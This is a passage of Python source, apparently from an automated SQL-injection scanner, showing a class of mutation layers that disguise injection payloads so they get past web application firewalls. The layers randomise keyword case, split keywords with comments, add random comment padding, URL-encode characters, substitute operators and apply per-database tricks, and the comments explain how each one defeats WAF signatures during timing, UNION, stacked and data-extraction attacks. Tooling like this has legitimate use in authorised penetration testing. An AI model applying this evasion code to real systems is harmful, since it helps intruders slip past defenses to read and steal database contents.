        layers 1 and 13 returned the SAME string, making layer 13 a no-op.
        Fix: uppercase SQL keywords before PME so the cache key differs from
        layer 1 (which operates on the payload as-is) and PME applies its
        case-randomisation layer to a fresh all-uppercase token stream.
        This reliably produces a structurally distinct obfuscated variant.
        FIX-CPU-REGEX (Req 9): Now uses class-level _ERROR_PAYLOAD_KEYWORDS_RE
        instead of re.compile() on every call — eliminates 300,000+ recompilations
        on cold-cache 15,000-payload scans.
        """
        # BUG-PME-UNBOUND FIX: use instance method via _get_pme()
        try:
            _up = self._ERROR_PAYLOAD_KEYWORDS_RE.sub(lambda m: m.group(0).upper(), payload)
            _pme = self._get_pme()
            if _pme is not None:
                return _pme.mutate(_up, self.dbms)
            return payload
        except Exception: return payload

    def mutate_timing_payload(self, payload: str) -> str:
        """Layer 14: timing-payload structural variant.
        BUG-LAYER14-DUPLICATE FIX: Was identical to mutate_boolean_payload —
        both called PayloadMutationEngine.mutate(payload, self.dbms) with no
        pre-transform.  Fix: strip the trailing SQL comment (-- / #) before
        PME so the cache key differs from layers 1 and 13.  With the comment
        removed, PME's Layer-7 (comment-style rotation) appends a fresh
        comment variant (-- +, #, -- word, etc.), producing a comment-diverse
        payload that WAF signatures haven't seen.  The SLEEP/WAITFOR duration
        is never mutated (PME Layer-1 _is_functional_number guard protects it).
        """
        # BUG-PME-UNBOUND FIX: use instance method via _get_pme()
        try:
            # Strip trailing comment to let PME pick a fresh comment style
            _stripped = re.sub(r'(?:--|#)[^\n]*$', '', payload).rstrip()
            _pme = self._get_pme()
            if _pme is not None:
                return _pme.mutate(_stripped, self.dbms)
            return payload
        except Exception: return payload

    def apply_waf_bypass(self, payload: str) -> str:
        # BUG-APPLY-WAF-BYPASS-EXTRACTION-SAFETY FIX:
        # During extraction, only apply pure whitespace/comment obfuscation.
        # apply_cascade() Layer 4 converts string literals to 0x/X'' hex notation, and
        # Layer 5 converts them to CHAR()/CHR()/NCHAR() call expressions.
        # Both are semantically equivalent for most uses, BUT:
        #   - X'' BLOB vs TEXT comparison in SQLite WHERE type='table' fails
        #   - 0x hex literals are invalid in PostgreSQL/Oracle → syntax error
        #   - CHAR() encoding in schema predicates creates expression contexts where
        #     some DBMS versions don't allow expressions in SEPARATOR/GROUP BY args
        # When in extraction phase, use only Layer 6 (whitespace variation) which is
        # universally safe across all 5 major DBMSes and all injection surfaces.
        try:
            if _EXTRACTION_ACTIVE[0]:
                # Safe extraction path: whitespace-only obfuscation from Layer 6
                _ext_variants = WAFBypassEngine.layer_6_whitespace_randomization(payload)
                if _ext_variants:
                    return _ext_variants[-1]
                # Layer 6 empty (no spaces): try pure comment-space from Layer 2
                _safe_variants = WAFBypassEngine.layer_2_comment_space_substitution(payload)
                # Layer 2 may have URL-encoded variants; filter to safe actual-whitespace only
                _really_safe = [v for v in _safe_variants
                                if '%' not in v and '!' not in v]  # exclude %09,%0a,/*!*/
                return _really_safe[-1] if _really_safe else (_safe_variants[0] if _safe_variants else payload)
            r = WAFBypassEngine.apply_cascade(payload, self.dbms)
            # apply_cascade returns List[str]; apply_all_20_layers returns dict
            if isinstance(r, dict):
                return r.get("final", payload)
            elif isinstance(r, list) and r:
                return r[-1]  # use most-obfuscated variant (last in list)
            elif isinstance(r, str):
                return r
            return payload
        except Exception: return payload

    def apply_novel_bypass(self, payload: str) -> str:
        """Layer 11: novel comment fragmentation of SQL keywords.

        BUG-10-FIX (Req 11): When earlier mutation layers (4, 6, 9) have already
        inserted /* */ comments, fragment_keywords() receives an already-fragmented
        payload. Its regex \bKEYWORD\b won't match 'SE/*x*/LECT' (word boundary fails
        at '/*'), so it returns the payload unchanged. The 'best variant' tracker in
        mutate_all() doesn't update and Layer 11 becomes a no-op.

        Fix: before fragmenting, collapse any existing /* ... */ comments back to
        plain whitespace so the payload is in 'clean' form again. fragment_keywords()
        then sees unobfuscated SQL keywords and reliably produces a differently-
        fragmented output that does NOT collide with the Layer 4/6/9 results.
        The cleaned form is used ONLY for this call; the original payload string
        (with its prior mutations) continues through the remaining layers.
        """
        try:
                        # Collapse existing /**/ and /* ... */ comment blocks to a single space
            _clean = _re.sub(r'/\*[^*]*\*/', ' ', payload)  # BUG-FIX-1C: __re was undefined
            _clean = _re.sub(r'\s+', ' ', _clean).strip()
            _result = WAFBypassEngine.fragment_keywords(_clean, style="c_comment")
            # Only use the result if it's actually different (change guard)
            if _result and _result != payload and _result != _clean:
                return _result
            # Fallback: try a different fragmentation style
            _result2 = WAFBypassEngine.fragment_keywords(_clean, style="space_comment")
            if _result2 and _result2 != payload:
                return _result2
            return WAFBypassEngine.fragment_keywords(payload, style="c_comment")
        except Exception:
            return payload

    def mutate(self, payload: str) -> str:
        return self.mutate_boolean_payload(payload)

    @staticmethod
    def waf_bypass_whitespace(p: str) -> str:
        try: return WAFBypassEngine.randomize_whitespace(p)
        except Exception: return p

    @staticmethod
    def waf_bypass_case(p: str) -> str:
        # FIX-CPU-IMPORT (Req 9): `import random` inside the method body is re-executed
        # as a dict lookup on every call (Python caches the module but still does the
        # lookup). With 15,000+ payloads × 20 mutation layers this happens 300,000+ times.
        # random is already imported at module level; just reference it directly.
        # BUG-V28-7 FIX (Req 9/CPU): Was `re.sub(r"(?i)" + kw, ...)` — bare re.sub does
        # NOT use the compiled-regex cache (get_compiled_regex / _re alias) maintained
        # throughout the rest of the file.  At ~510,000 calls per full scan (300 payloads ×
        # 10 categories × 17 techniques × 5 DBMSes × 2 true/false) each call paid a
        # pattern-compilation overhead.  Use _re.sub (module-level alias that shares the
        # interpreter's internal cache) to eliminate the repeated compilation overhead.
        # BUG-V29-1 FIX: Removed `import random as _wbc_rnd` — random is imported at
        # module level (line 768).  The local import alias adds an unnecessary sys.modules
        # dict lookup + binding on every call.  Use module-level `random` directly.
        for kw in ("SELECT","FROM","WHERE","AND","OR","UNION"):
            if kw in p.upper():
                p = _re.sub(r"(?i)" + kw,
                            "".join(c.upper() if random.random()>0.5 else c.lower() for c in kw), p, count=1)
        return p

    def _waf_bypass_case_sqlite_safe(self, p: str) -> str:
        """BUG-SQLITE-CASE-LAYER12 FIX (Req 6): Case-randomise SQL keywords while
        shielding SQLite-specific case-sensitive identifiers from modification.
        SQLite internal names (sqlite_master, sqlite_sequence, pragma_* etc.) and
        type-affinity keywords used in CREATE TABLE (INTEGER PRIMARY KEY, AUTOINCREMENT)
        must preserve their original case to avoid breaking valid SQLite SQL.
        Standard SQL keywords (SELECT, FROM, WHERE, AND, OR, UNION) are still safe
        to case-randomise because SQLite is case-insensitive for those.
        BUG-V29-1 FIX (Req 9/CPU): Removed `import random, re as _re_sc` from method
        body.  Python re-evaluates `import` statements on every call (dict lookup +
        aliasing in sys.modules).  At ~510K calls/scan this adds measurable per-call
        overhead and created a local `_re` alias that shadowed the module-level `_re`
        binding unnecessarily.  Use module-level `_re` and `random` directly."""
        # Shield SQLite-specific identifiers by replacing with placeholders
        _SQLITE_SHIELDS = [
            ('sqlite_master',      '__SQRX_SM__'),
            ('sqlite_sequence',    '__SQRX_SS__'),
            ('sqlite_stat1',       '__SQRX_SS1__'),
            ('sqlite_stat4',       '__SQRX_SS4__'),
            ('AUTOINCREMENT',      '__SQRX_AI__'),
            ('INTEGER PRIMARY KEY','__SQRX_IPK__'),
            ('pragma_',            '__SQRX_PG__'),
        ]
        _shielded = p
        for _orig, _placeholder in _SQLITE_SHIELDS:
            _shielded = _shielded.replace(_orig, _placeholder)
            _shielded = _shielded.replace(_orig.upper(), _placeholder)
            _shielded = _shielded.replace(_orig.lower(), _placeholder)
        # Apply standard case randomisation on the shielded string
        # BUG-V29-1 FIX: use module-level _re (same object as re; avoids local import overhead)
        for kw in ("SELECT","FROM","WHERE","AND","OR","UNION"):
            if kw in _shielded.upper():
                _shielded = _re.sub(r"(?i)" + kw,
                    "".join(c.upper() if random.random() > 0.5 else c.lower() for c in kw),
                    _shielded, count=1)
        # Restore shielded identifiers
        for _orig, _placeholder in _SQLITE_SHIELDS:
            _shielded = _shielded.replace(_placeholder, _orig)
        return _shielded

    @staticmethod
    def waf_bypass_comment(p: str) -> str:
        try: return WAFBypassEngine.fragment_keywords(p, style="c_comment")
        except Exception: return p

    @staticmethod
    def waf_bypass_buffer(p: str) -> str:
        # BUG-WAF-BYPASS-BUFFER-DETERMINISTIC FIX (MEDIUM, all DBMSes, all surfaces,
        # all extraction techniques):
        # The previous code always used the IDENTICAL comment buffer "/**/" * 3 =
        # "/**/**/**/" before and after AND/OR operators. WAFs that learn per-session
        # structural patterns can fingerprint "/**//**/**/ AND /**/**/**/" after seeing
        # it 2-3 times and then block all subsequent extraction probes in the same session.
        # Adaptive WAF products (Cloudflare, Imperva, Akamai, AWS WAF) specifically look
        # for repeated identical comment-padding patterns as a SQL injection heuristic.
        #
        # Fix: randomize the comment content on each call using random.randint so the
        # buffer is structurally different every time while remaining semantically a no-op.
        # Buffer variants: "/*<N>*/" where N is a random 3-6 digit integer.
        # Triple-buffering is kept (3 comment blocks) since it bypasses comment-length WAF
        # rules, but each block has different content.
        # Numeric safety: comment content is never a comparison operand — only the tokens
        # BETWEEN the AND/OR and the surrounding whitespace change; SQL semantics are
        # identical (/**/ and /*123*/ and /*xyz*/ are all whitespace to every DBMS).
        # String delimiter safety: this method never enters string literals — the replacement
        # targets " AND " and " OR " as bare token separators, not inside string contexts.
        import random as _rbuf
        _a = _rbuf.randint(100, 9999)
        _b = _rbuf.randint(100, 9999)
        _c = _rbuf.randint(100, 9999)
        buf_pre = f"/*{_a}*//*{_b}*//*{_c}*/"
        _d = _rbuf.randint(100, 9999)
        _e = _rbuf.randint(100, 9999)
        _f = _rbuf.randint(100, 9999)
        buf_post = f"/*{_d}*//*{_e}*//*{_f}*/"
        return p.replace(" AND ", f"{buf_pre}AND{buf_post}").replace(" OR ", f"{buf_pre}OR{buf_post}")

    @staticmethod
    def waf_bypass_exotic(p: str, dbms: str = "MySQL") -> str:
        try: return WAFBypassEngine.wrap_noop(p, dbms)
        except Exception: return p

    # ── Methods 13-20: additional real mutations ────────────────────────────

    def mutate_union_payload(self, payload: str) -> str:
        """Mutate UNION-based payloads: vary NULL representations, column
        separators, and comment terminator styles.
        BUG-V29-2 FIX (Req 9/CPU): Removed `import random, re as _re` from method body.
        The local `import re as _re` shadowed the module-level `_re` binding on every call,
        adding unnecessary per-call import overhead (~50-150 ns × 510K calls/scan = measurable
        CPU cost) and creating a confusing name collision.  Use module-level `_re` directly."""
        p = payload
        try:
            # Vary NULL columns: NULL → 0, 1, 'a', NULL/**/
            p = _re.sub(r'\bNULL\b', lambda _: random.choice(
                ['NULL', '0', '1', "'a'", 'NULL/**/']), p, count=1)
            # UNION SELECT → UNION/**/SELECT or UNION\nSELECT
            p = _re.sub(r'\bUNION\s+SELECT\b',
                        lambda _: random.choice([
                            'UNION/**/SELECT', 'UNION\tSELECT',
                            'UNION\nSELECT', 'UNION SELECT']),
                        p, flags=_re.IGNORECASE)
            # Vary comment terminator
            p = _re.sub(r'--\s*-\s*$', lambda _: random.choice(
                ['-- -', '#', '-- x', '--+']), p)
        except Exception:
            pass
        return p

    def mutate_stacked_payload(self, payload: str) -> str:
        """Mutate stacked-query payloads: vary semicolons, add harmless
        padding queries, and rotate comment/terminator styles.

        BUG-3-FIX (Req 3/6): The original code unconditionally inserted
        ';SELECT 1;' into ANY stacked payload.  This breaks:
          a) PCV stacked probes: '; SELECT pg_sleep(3)' becomes
             '; SELECT 1; SELECT pg_sleep(3)' — the delay still fires but
             the payload structure differs from the detection payload,
             causing SQL syntax errors on strict parsers.
          b) Oracle BEGIN...END blocks: '; BEGIN DBMS_SESSION.SLEEP(3); END'
             becomes '; BEGIN DBMS_SESSION.SLEEP(3); SELECT 1; END'
             — the SELECT inside a PL/SQL block raises PLS-00103.
          c) MSSQL WAITFOR DELAY: '; WAITFOR DELAY ...; SELECT 1;' is valid
             T-SQL but the semicolon spacing variation before WAITFOR can
             produce an unterminated statement on strict ODBC connections.
        Fix: only inject the SELECT 1 padding when the payload is a simple
        SELECT-based stacked query (starts with ';' and contains SELECT but
        NOT BEGIN/END or WAITFOR). Also skip when the payload is a PCV probe
        (detected by presence of 'pg_sleep', 'SLEEP', 'DBMS_' timing patterns).
        BUG-V29-2 FIX (Req 9/CPU): Removed `import random, re as _re` from method body.
        The local import shadowed the module-level `_re` binding unnecessarily.  Use
        module-level `_re` and `random` directly (same object, zero lookup cost change).
        """
        p = payload
        try:
            _pu = p.upper()
            # BUG-3-FIX: skip SELECT 1 injection for timing/PL-SQL payloads
            _is_timing = any(kw in _pu for kw in (
                'PG_SLEEP(', 'SLEEP(', 'WAITFOR', 'BENCHMARK(',
                'DBMS_SESSION', 'DBMS_LOCK', 'DBMS_PIPE',
                'RANDOMBLOB(', 'ZEROBLOB(', 'GENERATE_SERIES('))
            _is_plsql  = 'BEGIN' in _pu and 'END' in _pu
            # Vary semicolon spacing: ; → ;/**/ or ;\n
            p = _re.sub(r';', lambda _: random.choice(
                [';', ';/**/', ';\n', '; ']), p, count=1)
            # Add harmless SELECT 1 only for simple non-timing SELECT stacks
            # FIX-REQ10-ORACLE-STACK: Also skip SELECT 1 injection for Oracle.
            # Oracle does not support stacked queries in most contexts (DML triggers,
            # function bodies, CONNECT BY expressions).  Injecting ;SELECT 1; into
            # an Oracle payload causes ORA-00911 "invalid character" or ORA-00933
            # "SQL command not properly ended", making both the true AND false probes
            # fail identically — PCV Check B sees no timing delta and rejects.
            _is_oracle = getattr(self, 'dbms', '') in ('Oracle', 'oracle')
            if (';' in p and 'SELECT 1' not in p
                    and not _is_timing and not _is_plsql
                    and not _is_oracle
                    and 'SELECT' in _pu):
                p = p.replace(';', ';SELECT 1;', 1)
        except Exception:
            pass
        return p

    @staticmethod
    def waf_bypass_encoding(p: str) -> str:
        """Encoding-based WAF bypass: URL-encode quotes, parentheses and
        comparison operators so WAF string patterns miss them."""
        try:
            return (p
                    .replace("'", "%27")
                    .replace("(", "%28")
                    .replace(")", "%29")
                    .replace("=", "%3d"))
        except Exception:
            return p

    @staticmethod
    def waf_bypass_keyword_split(p: str) -> str:
        """Split SQL structural keywords using inline comments between characters to
        defeat WAF regex keyword detection (e.g. SE/**/LECT, WH/**/ERE).

        BUG-DEAD-IMPORT FIX: Removed `import random` — `random` was imported
        but never used in this function (no random.choice/randint calls exist).
        This was a dead import running in the 20-layer mutation hot path.

        BUG-SME-KEYWORD-SPLIT-FUNCNAME FIX (HIGH): Removed SLEEP, WAITFOR, and
        BENCHMARK from the keyword list.  These are SQL FUNCTION / STATEMENT names,
        not structural reserved words.  Splitting them with /**/ produces two
        separate lexer tokens that NO DBMS joins back into the original name:
          SLEEP     → SL/**/EEP     → two identifiers 'SL' and 'EEP'  (error)
          WAITFOR   → WAIT/**/FOR   → identifier 'WAIT', keyword FOR    (error)
          BENCHMARK → BENCH/**/MARK → two identifiers                   (error)
        For structural keywords MySQL specifically handles keyword splitting in its
        lexer (SE/**/LECT is still SELECT after comment stripping).  SLEEP/WAITFOR/
        BENCHMARK are NOT in MySQL's reserved-keyword lexer list — they are parsed
        as function/statement names at a higher grammar level, after the comment
        token has already been emitted as T_COMMENT.  The net result: any timing-
        based extraction payload where Layer 6 fires on SLEEP/WAITFOR/BENCHMARK
        produces a SQL syntax error on ALL 5 major DBMSes, silently corrupting
        every timing-based extraction probe that hits this path (~14% probability
        = 1 hit in 7 keyword checks before the `break`).
        Fix: only split STRUCTURAL SQL keywords that MySQL reliably handles via
        comment-stripping.  Keep FROM, WHERE which are safe (tested in sqlmap).
        """
        # Only split STRUCTURAL SQL reserved words that MySQL's lexer handles
        # via comment-stripping.  NEVER split function/statement names.
        keywords = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE",
                    "FROM", "WHERE"]
        for kw in keywords:
            if _re.search(r'\b' + kw + r'\b', p, _re.IGNORECASE):
                split_at = len(kw) // 2
                obf = kw[:split_at] + "/**/" + kw[split_at:]
                p = _re.sub(r'\b' + kw + r'\b', obf, p,
                            count=1, flags=_re.IGNORECASE)
                break  # one keyword per call keeps the payload short
        return p

    @staticmethod
    def waf_bypass_operator_sub(self_or_p, p_arg=None) -> str:
        """Substitute SQL operators with semantic equivalents that bypass
        WAF patterns keyed on specific operator tokens.

        BUG-REDUNDANT-IMPORT FIX: Removed `import random` — random is already
        imported at module level. Re-importing inside this static method on every
        call in the 20-layer mutation hot path was unnecessary.

        BUG-WAFBYPASS-LAYER7-OR-CORRUPTION FIX (Req 6/10): The OR→|| substitution
        corrupts payloads for PostgreSQL, Oracle, and MSSQL where || is the string
        concatenation operator, not logical OR.  Example: "' OR 1=1-- -" becomes
        "' || 1=1-- -" which causes a type-mismatch error on all non-MySQL DBMSes.
        Similarly AND→&& is MySQL/MariaDB-only syntax.
        Fix: make this method DBMS-aware using the instance's .dbms attribute (set
        by __init__) to restrict MySQL-only operators to MySQL/MariaDB targets.
        When called as a pure static (no .dbms on first arg), falls back to
        MySQL-safe operators only (no || or && in the choice list).
        """
        # Support both static and instance call patterns
        if p_arg is None:
            p = self_or_p   # static call: waf_bypass_operator_sub(payload)
            _dbms = ''
        else:
            p = p_arg       # instance call: self.waf_bypass_operator_sub(payload)
            _dbms = getattr(self_or_p, 'dbms', '') or ''
        # BUG-E2 FIX: removed '' from MySQL allowlist.  When this method is called as
        # a static (layer-7 lambda passes only the payload, no self) the dbms is '' and
        # the old code treated unknown DBMS as MySQL, enabling || and && for PostgreSQL/
        # Oracle/MSSQL targets where those operators have different semantics.
        _is_mysql = _dbms.lower() in ('mysql', 'mariadb', 'tidb', 'generic')
        ops = [
            # BUG-WAFBYPASS-LAYER7-OR-CORRUPTION FIX: Only offer && (MySQL-only
            # bitwise AND as logical AND) and || (MySQL-only logical OR) when the
            # DBMS is MySQL/MariaDB/Generic. For PostgreSQL/Oracle/MSSQL, restrict
            # to cross-DBMS safe variants: AND/**/ and OR/**/ (comment fragmentation
            # works universally without introducing SQL semantic changes).
            (r'\bAND\b',  (['AND', '&&', 'AND/**/'] if _is_mysql
                           else ['AND', 'AND/**/']),           _re.IGNORECASE),
            (r'\bOR\b',   (['OR',  '||', 'OR/**/'] if _is_mysql
                           else ['OR', 'OR/**/']),             _re.IGNORECASE),
            (r'\bNOT\b',  ['NOT', '!',  'NOT/**/'],           _re.IGNORECASE),
            (r'(?<!=)=(?!=)', ['=', ' LIKE ', ' IS '],        0),
            (r'<>',       ['<>', '!=', 'NOT LIKE'],           0),
        ]
        for pat, choices, flags in ops:
            if _re.search(pat, p, flags):
                replacement = random.choice(choices)
                p = _re.sub(pat, replacement, p, count=1, flags=flags)
                break
        return p

    def waf_bypass_string_manip(self, payload: str) -> str:
        """Manipulate string literals using concatenation so WAF string
        pattern matching misses the assembled value."""
        p = payload
        try:
            def concat_split(m):
                s = m.group(1)
                if len(s) < 2:
                    return m.group(0)
                mid = len(s) // 2
                if self.dbms in ("MySQL", "MariaDB"):
                    return f"CONCAT('{s[:mid]}','{s[mid:]}')"
                elif self.dbms == "PostgreSQL":
                    return f"'{s[:mid]}'||'{s[mid:]}'"
                elif self.dbms == "MSSQL":
                    # BUG-MSSQL-STRING-MANIP FIX: f"'{s[:mid]}'+''{s[mid:]}'" produces
                    # 'first'+''second' (broken SQL: ''second' has unmatched quotes).
                    # Correct MSSQL string concat: 'first'+'second'
                    return f"'{s[:mid]}'+'{s[mid:]}'"
                elif self.dbms == "Oracle":
                    return f"'{s[:mid]}'||'{s[mid:]}'"
                return m.group(0)
            p = _re.sub(r"'([^']{2,30})'", concat_split, p, count=1)
        except Exception:
            pass
        return p

    def apply_dbms_specific_bypass(self, payload: str) -> str:
        """Apply DBMS-specific bypass tricks: MySQL backtick quoting,
        PostgreSQL dollar-quoting, MSSQL bracket notation, SQLite BLOB."""
        p = payload
        try:
            if self.dbms in ("MySQL", "MariaDB"):
                # BUG-MYSQL-BACKTICK-KW FIX: Wrapping SQL keywords FROM/WHERE/SELECT
                # in backticks treats them as identifier names, not SQL keywords.
                # e.g. `SELECT` * `FROM` t fails — MySQL interprets backtick-wrapped
                # names as column/table identifiers, not keyword markers.
                # Safe MySQL-specific WAF bypass: inject /*!...*/ versioned comments
                # inside keyword gaps — MySQL executes them, most WAFs ignore them.
                                # Inject /*!50000*/ inline version-comment after one SQL keyword so
                # WAF regex pattern-matching on contiguous keyword strings is disrupted
                # while the MySQL parser still sees valid SQL.
                p = _re.sub(
                    r'\b(UNION|SELECT|FROM)\b',
                    lambda m: m.group(0) + '/*!50000*/',
                    p, count=1, flags=_re.IGNORECASE)
            elif self.dbms == "PostgreSQL":
                # BUG-PG-DOLLAR-QUOTE FIX: f"$$${m.group(1)}$$$" produced $$$text$$$
                # which is broken — PostgreSQL parses it as literal '$' + '$$text$$' + '$'
                # where the leading/trailing '$' are invalid standalone tokens.
                # Correct PostgreSQL dollar-quoting: $$text$$ (empty-tag, always valid).
                p = _re.sub(r"'([^']{1,30})'",
                             lambda m: f"$${m.group(1)}$$", p, count=1)
            elif self.dbms == "MSSQL":
                # BUG-MSSQL-BRACKET-KW FIX: Applying bracket notation to SQL reserved
                # keywords (SELECT, FROM, WHERE, UNION) produces invalid MSSQL SQL.
                # In SQL Server, [SELECT] at the start of a statement is treated as an
                # object identifier, not the SELECT keyword → syntax error.
                # Safe MSSQL WAF bypass: inject standard empty block comments /**/
                # between keywords — MSSQL accepts /**/ as a valid zero-length comment
                # while WAF regex pattern-matching on contiguous keyword strings fails.
                                p = _re.sub(
                    r'\b(UNION|SELECT|FROM|WHERE)\b',
                    lambda m: m.group(0) + '/**/',
                    p, count=1, flags=_re.IGNORECASE)
            elif self.dbms == "SQLite":
                # BLOB literal: 'value' → X'hex'
                p = _re.sub(r"'([^']{1,20})'",
                             lambda m: "X'" + m.group(1).encode("latin-1","replace").hex() + "'",
                             p, count=1)
        except Exception:
            pass
        return p

    # PATCH-ISSUE6: Keyword→technique inference map (used by patched mutate_all)
    _PAYLOAD_TECH_HINTS = [
        ('PG_SLEEP(', 'T'), ('SLEEP(', 'T'), ('WAITFOR', 'T'),
        ('BENCHMARK(', 'T'), ('RANDOMBLOB(', 'T'),
        ('DBMS_PIPE.RECEIVE_MESSAGE', 'T'), ('DBMS_LOCK.SLEEP', 'T'),
        ('GENERATE_SERIES(', 'T'),
        ('EXTRACTVALUE(', 'E'), ('UPDATEXML(', 'E'), ('XMLELEMENT(', 'E'),
        ('XMLATTRIBUTES(', 'E'), ('TO_NUMBER(', 'E'), ('XMLTYPE(', 'E'),
        ('UNION SELECT', 'U'), ('UNION ALL SELECT', 'U'),
        ('; SELECT', 'S'), (';SELECT', 'S'), ('; INSERT', 'S'), ('; DROP', 'S'),
    ]

    @classmethod
    def _infer_technique(cls, payload: str) -> str:
        """Auto-infer Layer-1 technique from payload keywords."""
        p_up = (payload or '').upper()
        for kw, tech in cls._PAYLOAD_TECH_HINTS:
            if kw.upper() in p_up:
                return tech
        return 'B'

    def mutate_all(self, payload: str, technique: str = "") -> str:
        """Apply all 20 mutation layers in sequence.  Every CERTIFIED payload
        is run through this before probing (Requirement 6).

        BUG-R6-A FIX: Added ``technique`` parameter so Layer 1 applies the
        correct technique-specific mutation instead of always calling
        ``mutate_boolean_payload`` for ALL techniques (T, E, U, S etc.).
        Callers should pass the active technique code (e.g. "T", "E", "U",
        "S", "B", "NV" …).  When omitted or empty the old behaviour is kept
        for backward-compatibility (boolean mutation used as Layer 1 default).

        REQ-6 FIX: Expanded from 10 to 20 distinct mutation layers so that ALL
        CERTIFIED_PAYLOAD_DATABASE payloads (300 per category × 10 categories)
        go through the full 20-layer pipeline.

        BUG-R6-A FIX: Previously layers that returned the same string as input
        were silently skipped with `if result and result != p: p = result`.
        The intent was correct (don't regress) but the old None/empty-string guard
        `if result` also swallowed a layer's output when it returned the empty
        string — which is valid for some edge-case payloads. Fixed: use
        `result is not None and result != ''` so truly-empty returns are still
        skipped, but None returns (layer crashed) are distinguished from no-change.
        The mutation guarantee is: ALL 20 layers ARE called; the result of each
        layer becomes the input to the next regardless of whether the layer changed
        anything.  Final output is the most-transformed variant seen so far.

        BUG-CPU-MUTATE-CACHE FIX: Cache results keyed by (dbms, payload) so the
        same payload string is never mutated more than once per DBMS across all
        surfaces, techniques, and cascade iterations.  With 300 payloads × 10
        categories × 17 techniques × 16 surfaces, the same payload string was
        previously mutated ~48,000 times per scan on a 6-DBMS target.  The LRU
        cache caps memory at 4,000 entries (~4MB) while giving near-100% hit rate
        on repeated identical payloads within a scan session.

        20-layer pipeline:
         1. PayloadMutationEngine.mutate (full 20-layer deep semantic mutation)
         2. waf_bypass_whitespace      (tab/double-space/comment whitespace)
         3. waf_bypass_case            (SeLeCT randomised case)
         4. waf_bypass_comment         (SE/*x*/LECT keyword fragmentation)
         5. waf_bypass_buffer          (/**/ buffer around AND/OR)
         6. waf_bypass_keyword_split   (UNION/**/ split on one keyword)
         7. waf_bypass_operator_sub    (AND→&&, OR→||, =→LIKE)
         8. waf_bypass_string_manip    (CONCAT/|| string split)
         9. apply_dbms_specific_bypass (backtick/dollar-quote/bracket notation)
        10. apply_waf_bypass           (WAFBypassEngine cascade)
        11. apply_novel_bypass         (SE/*x*/LECT novel fragmentation)
        12. waf_bypass_case            (case-randomise AFTER Layer-11 fragmentation — produces a
                                        structurally distinct variant from Layer 3 because the
                                        input here is already comment-fragmented/keyword-split)
            # NOTE: Layer 12 was previously apply_dbms_specific_bypass (BUG-LAYER12-DUPLICATE FIX).
            # It was a duplicate of Layer 9 — both called apply_dbms_specific_bypass on the same
            # payload, producing identical output (idempotent on its own output).  Replaced with
            # waf_bypass_case applied POST-fragmentation so each of the 20 layers is truly distinct.
            # waf_bypass_encoding was the original Layer 12 but was moved out of mutate_all() to
            # avoid caching URL-encoded SQL across non-URL surfaces (JSON/Header/Cookie).  It is
            # still applied as a standalone level>=3 variant in the scan loop.
        13. mutate_error_payload       (error-based variant via PME)
        14. mutate_timing_payload      (timing-safe variant via PME)
        15. mutate_union_payload       (UNION NULL/column rotation)
        16. mutate_stacked_payload     (semicolon spacing + padding)
        17-20. Four additional PayloadMutationEngine passes (independent random seeds
               from the PME LRU cache bucket rotation — each produces a distinct
               structural variant via layers 1-20 of PayloadMutationEngine.mutate)"""
